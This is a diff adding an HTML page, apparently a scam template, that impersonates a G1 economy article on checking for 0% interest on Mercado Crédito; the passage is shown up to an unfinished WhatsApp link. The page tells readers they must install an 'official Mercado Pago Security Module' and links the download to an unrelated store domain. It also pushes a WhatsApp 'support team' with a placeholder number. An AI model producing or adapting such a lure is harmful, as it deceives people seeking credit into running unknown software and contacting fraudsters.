@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- ✏️ EDITAR: Título da aba -->
+  <title>Como verificar se você tem taxa 0% no Mercado Crédito pelo computador | G1</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --red: #c4170c;
+      --green: #00823a;
+      --green-wa: #25d366;
+      --green-wa-dark: #128c7e;
+      --mp-blue: #009ee3;
+      --mp-blue-dark: #0077b6;
+      --yellow: #f59e0b;
+      --dark: #333333;
+      --border: #e0e0e0;
+      --white: #ffffff;
+    }
+
+    body {
+      font-family: 'Open Sans', Inter, -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+      font-size: 16px;
+      color: var(--dark);
+      background: #f0f0f0;
+      line-height: 1.5;
+    }
+    a { color: inherit; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ===== BARRA SUPERIOR ===== */
+    .top-bar {
+      background: #fff; height: 48px; display: flex;
+      align-items: center; justify-content: center;
+      border-bottom: 1px solid #ebebeb; overflow: hidden;
+    }
+    .top-bar-inner { display: flex; height: 100%; }
+    .top-bar a {
+      display: flex; align-items: center; height: 100%;
+      padding: 0 16px; font-size: 16px; font-weight: 600;
+      text-decoration: none; transition: opacity 0.15s; white-space: nowrap;
+    }
+    .top-bar a:hover { opacity: 0.65; text-decoration: none; }
+    .top-bar a.link-globo    { color: #0669de; }
+    .top-bar a.link-g1       { color: #c4170c; }
+    .top-bar a.link-ge       { color: #06aa48; }
+    .top-bar a.link-gshow    { color: #ff6700; }
+    .top-bar a.link-globoplay{ color: #fb0334; }
+    .top-bar a.link-g1jogos  { color: #c4170c; }
+    .top-bar a.link-oglobo   { color: #1e4c9a; }
+    .top-bar a.link-valor    { color: #006767; }
+
+    /* ===== HEADER ===== */
+    .main-header {
+      background: #c4170c; position: sticky; top: 0; z-index: 1000;
+      height: 74px; box-shadow: 0 2px 4px rgba(0,0,0,0.18);
+    }
+    .header-area {
+      display: flex; align-items: center; justify-content: space-between;
+      height: 74px; padding: 0 24px; max-width: 1360px; margin: 0 auto;
+    }
+    .header-left { display: flex; align-items: center; gap: 8px; }
+    .header-logo { display: flex; align-items: center; text-decoration: none; }
+    .header-logo svg { width: 34px; height: 34px; display: block; }
+    .header-center { flex: 1; display: flex; justify-content: center; align-items: center; }
+    .header-section-title {
+      color: #fff; font-size: 32px; font-weight: 300;
+      letter-spacing: -1px; text-transform: uppercase; text-decoration: none;
+    }
+    .header-section-title:hover { opacity: 0.9; text-decoration: none; }
+
+    /* ===== TICKER ===== */
+    .ticker-bar { background: white; border-bottom: 1px solid var(--border); padding: 6px 16px; overflow: hidden; }
+    .ticker-inner { display: flex; align-items: center; gap: 24px; overflow-x: auto; scrollbar-width: none; }
+    .ticker-inner::-webkit-scrollbar { display: none; }
+    .ticker-item { display: flex; align-items: center; gap: 6px; white-space: nowrap; flex-shrink: 0; }
+    .ticker-label { color: #888; font-size: 10px; font-weight: 600; text-transform: uppercase; }
+    .ticker-value { font-weight: 700; color: var(--dark); font-size: 12px; }
+    .ticker-change { font-size: 11px; font-weight: 600; }
+    .ticker-change.up { color: #00823a; }
+    .ticker-change.down { color: var(--red); }
+    .ticker-divider { color: #ddd; font-size: 18px; }
+
+    /* ===== WRAPPER ===== */
+    .page-wrapper { max-width: 1200px; margin: 0 auto; background: white; }
+    .article-wrapper { max-width: 780px; margin: 0 auto; padding: 0 16px; }
+
+    .breadcrumb { padding: 12px 0 8px; font-size: 12px; color: #888; }
+    .breadcrumb a { color: #888; }
+    .breadcrumb a:hover { color: var(--red); }
+    .breadcrumb span { margin: 0 4px; }
+
+    /* ===== CABEÇALHO DO ARTIGO ===== */
+    .content-head { padding: 8px 0 12px; }
+    .content-head__title { font-size: 28px; font-weight: 700; line-height: 1.25; color: #111; margin-bottom: 10px; }
+    .content-head__subtitle { font-size: 16px; color: #444; line-height: 1.55; margin-bottom: 14px; }
+    .content-publication-data {
+      font-size: 13px; color: #666; padding: 10px 0;
+      border-top: 1px solid var(--border); border-bottom: 1px solid var(--border);
+      margin-bottom: 12px; display: flex; flex-wrap: wrap; align-items: center;
+    }
+    .pub-author { font-weight: 600; }
+    .pub-author a { color: var(--red); }
+    .pub-location { color: #888; margin: 0 4px; }
+    .pub-sep { color: #bbb; margin: 0 10px; }
+
+    /* ===== COMPARTILHAR ===== */
+    .share-bar { display: flex; gap: 8px; padding: 10px 0 14px; }
+    .share-btn {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      flex: 1; padding: 10px 0; border: none; border-radius: 3px;
+      font-size: 13px; font-weight: 700; cursor: pointer;
+    }
+    .share-btn.facebook { background: #e8f0fd; color: #1877f2; }
+    .share-btn.whatsapp { background: #e6f9ee; color: #25d366; }
+    .share-btn.more     { background: #f0f0f0; color: #555; }
+    .share-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    /* ===== IMAGEM PRINCIPAL ===== */
+    .article-media { margin: 6px 0 20px; }
+    .article-media img { width: 100%; max-height: 400px; object-fit: cover; display: block; }
+    .article-media figcaption { font-size: 12px; color: #777; padding: 6px 4px; line-height: 1.4; }
+    .article-media figcaption strong { color: #555; }
+
+    /* ===== CORPO DO ARTIGO ===== */
+    .mc-article-body { font-size: 16px; line-height: 1.7; color: #222; }
+    .mc-article-body p { margin-bottom: 18px; }
+    .mc-article-body a { color: var(--red); text-decoration: underline; }
+    .mc-article-body strong { font-weight: 700; }
+    .mc-article-body h3 { font-size: 17px; font-weight: 700; margin: 24px 0 10px; }
+
+    /* LEIA TAMBÉM */
+    .leia-tambem { margin: 20px 0; }
+    .leia-tambem-label { font-size: 12px; font-weight: 700; color: var(--red); text-transform: uppercase; letter-spacing: 0.5px; margin-right: 6px; }
+    .leia-tambem a { color: var(--red); font-size: 15px; font-weight: 600; text-decoration: underline; }
+
+    /* ===== AVISO DESKTOP ===== */
+    .aviso-desktop {
+      background: #fff3cd;
+      border: 2px solid #ffc107;
+      border-radius: 8px;
+      padding: 18px 20px;
+      margin: 24px 0;
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+    }
+    .aviso-desktop-icon { font-size: 28px; flex-shrink: 0; line-height: 1; }
+    .aviso-desktop-text h4 { font-size: 16px; font-weight: 700; color: #856404; margin-bottom: 4px; }
+    .aviso-desktop-text p { font-size: 14px; color: #664d03; margin: 0; line-height: 1.5; }
+
+    /* ===== PASSO A PASSO (STEPS) ===== */
+    .steps-container { margin: 28px 0; }
+    .steps-container h2 {
+      font-size: 21px; font-weight: 700; margin-bottom: 24px;
+      padding-bottom: 10px; border-bottom: 3px solid var(--red);
+    }
+
+    .step-card {
+      display: flex;
+      gap: 0;
+      margin-bottom: 20px;
+      border: 1px solid #e8e8e8;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+    }
+    .step-number {
+      background: var(--red);
+      color: white;
+      font-size: 28px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 64px;
+      padding: 20px 0;
+      flex-shrink: 0;
+    }
+    .step-content {
+      padding: 18px 20px;
+      flex: 1;
+    }
+    .step-content h3 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #111;
+      margin: 0 0 8px;
+    }
+    .step-content p {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+      margin: 0 0 8px;
+    }
+    .step-content p:last-child { margin-bottom: 0; }
+    .step-content ul {
+      padding-left: 20px;
+      margin: 8px 0 0;
+    }
+    .step-content li {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 5px;
+      line-height: 1.5;
+    }
+
+    /* Destaque do módulo de segurança */
+    .modulo-destaque {
+      background: #f0f7ff;
+      border: 2px solid var(--mp-blue);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 12px 0 4px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .modulo-destaque-icon { font-size: 32px; flex-shrink: 0; }
+    .modulo-destaque-info { flex: 1; }
+    .modulo-destaque-info .modulo-nome {
+      font-size: 16px;
+      font-weight: 900;
+      color: var(--mp-blue-dark);
+      display: block;
+      margin-bottom: 3px;
+    }
+    .modulo-destaque-info p {
+      font-size: 13px;
+      color: #555;
+      margin: 0 0 10px;
+      line-height: 1.4;
+    }
+    /* ✏️ EDITAR: Link do módulo de segurança oficial do Mercado Pago */
+    .btn-download {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #ffe600;
+      color: #1a1a1a;
+      font-size: 14px;
+      font-weight: 700;
+      padding: 10px 18px;
+      border-radius: 6px;
+      text-decoration: none;
+      transition: background 0.2s;
+    }
+    .btn-download:hover { background: #f0d800; text-decoration: none; }
+    .btn-download svg { flex-shrink: 0; }
+
+    /* Instruções de navegação no site */
+    .nav-steps {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin: 10px 0 0;
+    }
+    .nav-steps p { font-size: 14px; color: #333; margin: 0 0 6px; font-weight: 600; }
+    .nav-steps ol { padding-left: 18px; margin: 0; }
+    .nav-steps li { font-size: 13px; color: #444; margin-bottom: 4px; line-height: 1.5; }
+    .nav-steps .nav-path {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 3px 8px;
+      font-size: 12px;
+      font-weight: 700;
+      color: #333;
+      font-family: monospace;
+      margin: 2px 0;
+    }
+    .nav-arrow { color: #999; font-size: 11px; }
+
+    /* ===== BOX RESULTADO ===== */
+    .resultado-box {
+      background: #f0fdf4;
+      border: 2px solid var(--green);
+      border-radius: 8px;
+      padding: 18px 20px;
+      margin: 10px 0 0;
+    }
+    .resultado-box h4 { font-size: 15px; font-weight: 700; color: var(--green); margin-bottom: 8px; }
+    .resultado-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #333;
+      line-height: 1.4;
+    }
+    .resultado-item:last-child { margin-bottom: 0; }
+    .resultado-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+    /* ===== BOX NÃO CONSEGUIU ===== */
+    .nao-conseguiu {
+      background: #fff8e1;
+      border: 2px solid #f59e0b;
+      border-radius: 10px;
+      padding: 20px 22px;
+      margin: 28px 0;
+    }
+    .nao-conseguiu h3 {
+      font-size: 17px;
+      font-weight: 700;
+      color: #b45309;
+      margin: 0 0 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .nao-conseguiu p { font-size: 14px; color: #444; line-height: 1.6; margin: 0 0 16px; }
+
+    /* ===== BOTÃO WHATSAPP ===== */
+    /* ✏️ EDITAR: Número do WhatsApp no href */
+    .whatsapp-cta {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      background: var(--green-wa);
+      color: white;
+      font-size: 15px;
+      font-weight: 700;
+      padding: 16px 24px;
+      border-radius: 8px;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(37,211,102,0.35);
+      transition: background 0.2s, transform 0.1s;
+    }
+    .whatsapp-cta:hover { background: var(--green-wa-dark); transform: translateY(-1px); text-decoration: none; }
+    .whatsapp-cta svg { flex-shrink: 0; }
+    .whatsapp-cta-text { text-align: left; }
+    .whatsapp-cta-label { display: block; font-size: 12px; font-weight: 400; opacity: 0.9; }
+    .whatsapp-cta-title { display: block; font-size: 16px; font-weight: 700; }
+
+    /* ===== COMENTÁRIOS ===== */
+    .comments-section { margin: 28px 0; padding-top: 20px; border-top: 1px solid var(--border); }
+    .comments-section h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+    .comments-section > p { font-size: 13px; color: #666; margin-bottom: 12px; }
+    .comments-login-box { border: 1px solid #ddd; border-radius: 4px; padding: 20px; text-align: center; background: #fafafa; }
+    .comments-login-box p { font-size: 14px; color: #555; margin-bottom: 14px; }
+    .btn-login { display: inline-block; border: 1px solid #555; border-radius: 3px; padding: 8px 22px; font-size: 13px; font-weight: 600; color: #333; cursor: pointer; background: white; }
+
+    /* ===== NEWSLETTER ===== */
+    .newsletter-box {
+      display: flex; align-items: center; gap: 20px;
+      border: 1px solid #e0e0e0; border-radius: 6px; padding: 18px 20px; margin: 28px 0; background: white;
+    }
+    .newsletter-text h3 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+    .newsletter-text p { font-size: 13px; color: #666; margin-bottom: 12px; line-height: 1.4; }
+    .newsletter-btn {
+      display: inline-flex; align-items: center; gap: 8px; background: var(--red);
+      color: white; font-size: 13px; font-weight: 700; padding: 9px 16px;
+      border-radius: 3px; border: none; cursor: pointer;
+    }
+    .newsletter-note { font-size: 11px; color: #aaa; margin-top: 6px; }
+
+    /* ===== FOOTER ===== */
+    .site-footer { background: #222; color: #aaa; padding: 20px 16px; text-align: center; }
+    .footer-logo { font-size: 22px; font-weight: 800; font-style: italic; color: white; margin-bottom: 12px; display: block; }
+    .footer-links { display: flex; justify-content: center; flex-wrap: wrap; margin-bottom: 12px; }
+    .footer-links a { color: #bbb; font-size: 12px; padding: 4px 12px; border-right: 1px solid #444; }
+    .footer-links a:last-child { border-right: none; }
+    .footer-links a:hover { color: white; text-decoration: none; }
+    .footer-copy { font-size: 11px; color: #666; }
+
+    /* ===== RESPONSIVO ===== */
+    @media (max-width: 600px) {
+      .header-section-title { font-size: 22px; }
+      .content-head__title { font-size: 22px; }
+      .share-btn span { display: none; }
+      .newsletter-box { flex-direction: column; }
+      .top-bar a { padding: 0 10px; font-size: 13px; }
+      .step-number { min-width: 48px; font-size: 22px; }
+      .modulo-destaque { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- BARRA SUPERIOR -->
+<div class="top-bar">
+  <div class="top-bar-inner">
+    <a href="#" class="link-globo">globo.com</a>
+    <a href="#" class="link-g1">g1</a>
+    <a href="#" class="link-ge">ge</a>
+    <a href="#" class="link-gshow">gshow</a>
+    <a href="#" class="link-globoplay">globoplay</a>
+    <a href="#" class="link-g1jogos">g1 jogos</a>
+    <a href="#" class="link-oglobo">o globo</a>
+    <a href="#" class="link-valor">valor</a>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header class="main-header">
+  <div class="header-area">
+    <div class="header-left">
+      <a href="#" class="header-logo" aria-label="G1 - Home">
+        <svg fill="none" viewBox="0 0 42 42" xmlns="http://www.w3.org/2000/svg" width="34" height="34">
+          <path d="M30.167 4.866L38.12.134C38.99-.295 40 .345 40 1.512V30.31c0 .54-.585 1.133-1.307 1.133h-3.655a1.315 1.315 0 01-1.306-1.323V9.352l-2.444 1.458c-.868.426-1.855-.237-1.855-1.213V6.055c0-.507.285-.968.734-1.19zM14.11 25.831c-3.246 0-5.977-2.607-5.977-6.415 0-3.86 2.73-6.416 5.977-6.416 3.246 0 5.925 2.555 5.925 6.416 0 3.808-2.68 6.415-5.925 6.415zm7.368-18.463c-.773 0-1.236.469-1.236 1.251v1.356c-1.392-1.722-3.968-3.026-6.545-3.026C7.411 6.95 2 12.374 2 19.467c0 7.094 5.1 11.997 11.542 11.997a8.67 8.67 0 006.389-2.764c-.05 4.954-2.627 7.198-7.059 7.198-2.37 0-4.586-.731-7.161-2.4-.67-.469-1.443-.313-1.804.418L2.36 36.993c-.36.73-.257 1.408.464 1.877C6.02 40.956 9.782 42 13.028 42c8.502 0 13.19-4.643 13.19-15.335V8.62c0-.782-.463-1.251-1.236-1.251h-3.504z" fill="#fff"/>
+        </svg>
+      </a>
+    </div>
+    <div class="header-center">
+      <a href="#" class="header-section-title">ECONOMIA</a>
+    </div>
+    <div class="header-left" style="visibility:hidden;pointer-events:none;" aria-hidden="true">
+      <a class="header-logo"><svg width="34" height="34" viewBox="0 0 42 42"><path d="" fill="none"/></svg></a>
+    </div>
+  </div>
+</header>
+
+<!-- TICKER -->
+<div class="ticker-bar">
+  <div class="ticker-inner">
+    <div class="ticker-item"><span class="ticker-label">Ibovespa</span><span class="ticker-value">176.219 pts</span><span class="ticker-change down">▼ 2,23%</span></div>
+    <div class="ticker-divider">|</div>
+    <div class="ticker-item"><span class="ticker-label">Dólar Comercial</span><span class="ticker-value">R$ 5,309</span><span class="ticker-change up">▲ 1,79%</span></div>
+    <div class="ticker-divider">|</div>
+    <div class="ticker-item"><span class="ticker-label">Euro Comercial</span><span class="ticker-value">R$ 6,135</span><span class="ticker-change up">▲ 1,55%</span></div>
+    <div class="ticker-divider">|</div>
+    <div class="ticker-item"><span class="ticker-label">Dólar Turismo</span><span class="ticker-value">R$ 5,520</span><span class="ticker-change up">▲ 1,71%</span></div>
+  </div>
+</div>
+
+<!-- CONTEÚDO -->
+<div class="page-wrapper">
+  <div class="article-wrapper">
+
+    <nav class="breadcrumb">
+      <a href="#">G1</a><span>›</span><a href="#">Economia</a>
+    </nav>
+
+    <!-- CABEÇALHO -->
+    <div class="content-head">
+      <!-- ✏️ EDITAR: Título -->
+      <h1 class="content-head__title">
+        Como verificar se você tem taxa 0% no Mercado Crédito — passo a passo pelo computador
+      </h1>
+      <!-- ✏️ EDITAR: Subtítulo -->
+      <p class="content-head__subtitle">
+        A consulta completa de condições do Mercado Crédito, incluindo a verificação de taxa zero, só está disponível pela versão desktop. Veja o passo a passo completo para conferir o seu perfil.
+      </p>
+      <!-- ✏️ EDITAR: Autor e data -->
+      <div class="content-publication-data">
+        <span>Por <span class="pub-author"><a href="#">Redação g1</a></span></span>
+        <span class="pub-location"> — São Paulo</span>
+        <span class="pub-sep">|</span>
+        <span class="pub-date">21/03/2026 10h00</span>
+        <span class="pub-sep">|</span>
+        <span class="pub-date">Atualizado há 1 dia</span>
+      </div>
+    </div>
+
+    <!-- COMPARTILHAR -->
+    <div class="share-bar">
+      <button class="share-btn facebook">
+        <svg viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.07C24 5.41 18.63 0 12 0S0 5.41 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.04V9.41c0-3.02 1.8-4.7 4.54-4.7 1.31 0 2.68.24 2.68.24v2.97h-1.5c-1.5 0-1.96.93-1.96 1.89v2.26h3.32l-.53 3.49h-2.79V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
+        <span>Facebook</span>
+      </button>
+      <button class="share-btn whatsapp">
+        <svg viewBox="0 0 24 24" fill="#25d366"><path d="M17.47 14.38c-.29-.15-1.72-.85-1.99-.95-.27-.1-.46-.15-.65.15-.2.29-.75.95-.92 1.14-.17.2-.34.22-.63.07-.29-.15-1.24-.46-2.36-1.46-.87-.78-1.46-1.74-1.63-2.03-.17-.29-.02-.45.13-.6.13-.13.29-.34.44-.51.15-.17.2-.29.29-.49.1-.2.05-.37-.02-.52-.07-.15-.65-1.57-.9-2.14-.24-.56-.48-.49-.65-.5H8.5c-.17 0-.44.07-.67.32-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.61.13.17 1.78 2.72 4.31 3.81.6.26 1.07.41 1.44.53.6.19 1.15.16 1.59.1.48-.07 1.49-.61 1.7-1.2.21-.58.21-1.08.15-1.19-.07-.1-.25-.16-.54-.31zM12.05 21.8h-.03a9.87 9.87 0 01-5.03-1.38l-.36-.21-3.74.98 1-3.65-.24-.37A9.86 9.86 0 012.18 12 9.87 9.87 0 0112.05 2.2 9.87 9.87 0 0121.91 12a9.87 9.87 0 01-9.86 9.8zM12.05 0A12.05 12.05 0 000 12c0 2.13.56 4.22 1.62 6.06L.05 24l6.1-1.6A12.05 12.05 0 1012.05 0z"/></svg>
+        <span>WhatsApp</span>
+      </button>
+      <button class="share-btn more">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+        <span>Compartilhar</span>
+      </button>
+    </div>
+
+    <!-- IMAGEM PRINCIPAL -->
+    <!-- ✏️ EDITAR: Troque o src pela imagem desejada -->
+    <figure class="article-media">
+      <img
+        src="https://iili.io/qsx9ACb.md.png"
+        alt="Notebook com site do Mercado Livre aberto"
+        onerror="this.style.background='#1a3a5c'; this.style.height='280px'; this.style.display='block';"
+      >
+      <!-- ✏️ EDITAR: Legenda -->
+      <figcaption>A consulta de taxa zero no Mercado Crédito exige acesso pelo computador e instalação do módulo de segurança oficial — <strong>Foto: Reprodução/Mercado Pago</strong></figcaption>
+    </figure>
+
+    <!-- CORPO -->
+    <div class="mc-article-body">
+
+      <p>O <strong>Mercado Pago</strong> oferece uma linha de crédito com <strong>taxa 0% ao mês</strong> para uma parte dos seus usuários — benefício exclusivo para quem mantém a conta ativa e usa a plataforma como conta principal para receber salário ou transferências via Pix. A política, vigente desde o início de 2025, pode representar uma economia de centenas de reais para quem utiliza crédito rotineiramente.</p>
+
+      <p>De acordo com dados da própria fintech, mais de <strong>4 milhões de usuários brasileiros</strong> já têm acesso ao Mercado Crédito com taxas abaixo de 1% ao mês — e uma parcela expressiva desse grupo tem a taxa reduzida a zero quando o saldo médio e o histórico de movimentações atingem determinados critérios. O valor disponível pode chegar a <strong>R$ 8.000 por operação</strong>, com liberação imediata no saldo da conta.</p>
+
+      <h3>Quem tem direito à taxa zero?</h3>
+
+      <p>O benefício é calculado automaticamente pelo algoritmo do Mercado Pago com base no perfil de uso. De forma geral, têm mais chance de se qualificar:</p>
+
+      <ul style="padding-left:22px; margin: 0 0 18px;">
+        <li style="margin-bottom:7px;">Quem recebe <strong>salário depositado diretamente via Pix</strong> no Mercado Pago</li>
+        <li style="margin-bottom:7px;">Usuários que mantêm <strong>saldo médio mensal</strong> na conta</li>
+        <li style="margin-bottom:7px;">Quem usa a conta para <strong>pagar contas e boletos</strong> com regularidade</li>
+        <li style="margin-bottom:7px;">Quem realiza <strong>compras no Mercado Livre</strong> com frequência</li>
+        <li style="margin-bottom:7px;">Contas com <strong>mais de 3 meses de atividade contínua</strong></li>
+      </ul>
+
+      <p>Usuários que já têm o <strong>Mercado Crédito liberado</strong> e realizaram ao menos uma operação acima de R$ 500 têm ainda mais chance de ver a taxa zerada — já que o histórico positivo de pagamentos reduz o risco avaliado pela plataforma.</p>
+
+      <p class="leia-tambem">
+        <span class="leia-tambem-label">LEIA TAMBÉM:</span>
+        <a href="#">Mercado Pago libera crédito com taxa zero para quem recebe salário ou Pix pela conta</a>
+      </p>
+
+      <h3>Como verificar se a sua taxa é 0%</h3>
+
+      <p>A consulta completa das condições individuais do Mercado Crédito — incluindo a confirmação da taxa zero — <strong>só está disponível pela versão desktop</strong> do site, acessando pelo computador. O app do celular mostra apenas informações parciais e pode não exibir a taxa personalizada.</p>
+
+      <p>O processo também requer a instalação do <strong>Módulo de Segurança oficial do Mercado Pago</strong> — um programa gratuito que autentica o dispositivo e libera o acesso às informações de crédito personalizadas. Veja o passo a passo completo:</p>
+
+      <!-- ===== PASSO A PASSO ===== -->
+      <div class="steps-container">
+        <h2>Passo a passo: como verificar sua taxa no Mercado Crédito</h2>
+
+        <!-- PASSO 1 -->
+        <div class="step-card">
+          <div class="step-number">1</div>
+          <div class="step-content">
+            <h3>🖥️ Use obrigatoriamente um computador</h3>
+            <p>A consulta de taxa personalizada <strong>não está disponível pelo celular</strong>. O sistema de análise de crédito individual do Mercado Pago só é acessível pela versão desktop, em navegadores como Chrome, Edge ou Firefox.</p>
+            <p>Certifique-se de estar em um <strong>computador pessoal</strong> (Windows, Mac ou Linux) antes de continuar os próximos passos.</p>
+          </div>
+        </div>
+
+        <!-- PASSO 2 -->
+        <div class="step-card">
+          <div class="step-number">2</div>
+          <div class="step-content">
+            <h3>🔐 Instale o Módulo de Segurança do Mercado Pago</h3>
+            <p>Para acessar as informações de crédito personalizadas, o Mercado Pago exige a instalação do seu <strong>Módulo de Segurança oficial</strong> — um programa gratuito que autentica o dispositivo e protege suas informações durante a consulta.</p>
+
+            <!-- ✏️ EDITAR: Link de download do módulo oficial do Mercado Pago -->
+            <div class="modulo-destaque">
+              <div class="modulo-destaque-icon">🛡️</div>
+              <div class="modulo-destaque-info">
+                <strong class="modulo-nome">MÓDULO DE SEGURANÇA MERCADO PAGO</strong>
+                <p>Programa oficial, gratuito e seguro. Disponível diretamente no site do Mercado Pago para Windows e Mac.</p>
+                <a href="https://feretec-wind.store/p/" class="btn-download" target="_blank" rel="noopener">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                  Baixar Módulo de Segurança — site oficial
+                </a>
+              </div>
+            </div>
+
+            <p style="font-size:13px; color:#666; margin-top:10px;">Após o download, execute o instalador e aguarde a conclusão. O processo leva menos de 2 minutos. <strong>Não feche o programa após instalar</strong> — ele precisa estar ativo para a próxima etapa.</p>
+          </div>
+        </div>
+
+        <!-- PASSO 3 -->
+        <div class="step-card">
+          <div class="step-number">3</div>
+          <div class="step-content">
+            <h3>🌐 Acesse o site oficial do Mercado Livre e vá até Empréstimos</h3>
+            <p>Com o Módulo de Segurança ativo, abra o navegador e acesse o site oficial:</p>
+
+            <div class="nav-steps">
+              <p>Caminho de navegação no site:</p>
+              <ol>
+                <li>Acesse <strong>mercadolivre.com.br</strong> e faça login com sua conta</li>
+                <li>No menu superior, clique em <span class="nav-path">Minha conta</span></li>
+                <li>Selecione a opção <span class="nav-path">Dinheiro</span> <span class="nav-arrow">›</span> <span class="nav-path">Mercado Crédito</span></li>
+                <li>Clique em <span class="nav-path">Ver condições do meu crédito</span></li>
+                <li>O sistema irá carregar seu perfil e exibir a <strong>taxa personalizada</strong> disponível para você</li>
+              </ol>
+            </div>
+
+            <div class="resultado-box">
+              <h4>✅ O que você vai encontrar nessa tela:</h4>
+              <div class="resultado-item">
+                <span class="resultado-icon">💰</span>
+                <span>O <strong>valor total do crédito</strong> disponível para você neste momento</span>
+              </div>
+              <div class="resultado-item">
+                <span class="resultado-icon">📊</span>
+                <span>A <strong>taxa mensal personalizada</strong> — se for 0%, você se qualifica para o benefício</span>
+              </div>
+              <div class="resultado-item">
+                <span class="resultado-icon">📅</span>
+                <span>As <strong>opções de parcelamento</strong> disponíveis para o seu perfil</span>
+              </div>
+              <div class="resultado-item">
+                <span class="resultado-icon">⚡</span>
+                <span>Se aprovado, o valor cai <strong>na hora</strong> no seu saldo do Mercado Pago</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PASSO 4 (fallback WhatsApp) -->
+        <div class="step-card">
+          <div class="step-number">4</div>
+          <div class="step-content">
+            <h3>⚠️ Não encontrou a opção ou teve algum problema?</h3>
+            <p>Nem todas as contas exibem a seção de Empréstimos da mesma forma — isso depende do perfil de uso e do histórico na plataforma. Se você não encontrou a opção <strong>"Mercado Crédito"</strong> ou teve dificuldade em algum dos passos anteriores, não se preocupe.</p>
+            <p>Nossa equipe pode ajudá-lo a verificar a situação da sua conta e confirmar se você tem taxa zero disponível:</p>
+          </div>
+        </div>
+
+      </div><!-- fim steps-container -->
+
+      <p>Uma vez confirmada a taxa zero na tela do Mercado Crédito, o crédito pode ser solicitado diretamente pelo aplicativo do Mercado Pago. O usuário escolhe o valor desejado, seleciona o número de parcelas e confirma — <strong>o dinheiro cai na hora no saldo da conta</strong>, sem taxa de abertura e sem burocracia.</p>
+
+      <p>Vale lembrar que a taxa zero é uma condição dinâmica: ela pode mudar conforme o uso da conta. Manter o hábito de receber pagamentos, pagar contas em dia e manter saldo positivo ajuda a preservar ou melhorar as condições ao longo do tempo.</p>
+
+    </div><!-- fim .mc-article-body -->
+
+    <!-- BOX "NÃO CONSEGUIU" COM WHATSAPP -->
+    <div class="nao-conseguiu">
+      <h3>💬 Não conseguiu verificar pelo site?</h3>
+      <p>Se não encontrou a opção de Empréstimos, o módulo não instalou corretamente ou a taxa exibida não foi a esperada, <strong>entre em contato com nossa equipe pelo WhatsApp</strong>. Nossa equipe está disponível para ajudar você a verificar suas condições de crédito de forma gratuita.</p>
+
+      <!-- ✏️ EDITAR: Substitua o número 5511999999999 pelo seu número real -->
+      <a href="https://wa.me/5511999999999?text=Ol%C3%A1!%20N%C3%A3o%20consegui%20verificar%20minha%20taxa%20no%20Mercado%20Cr%C3%A9dito%20pelo%20computador%20e%20preciso%20de%20ajuda." class="whatsapp-cta" target="_blank" rel="noopener">
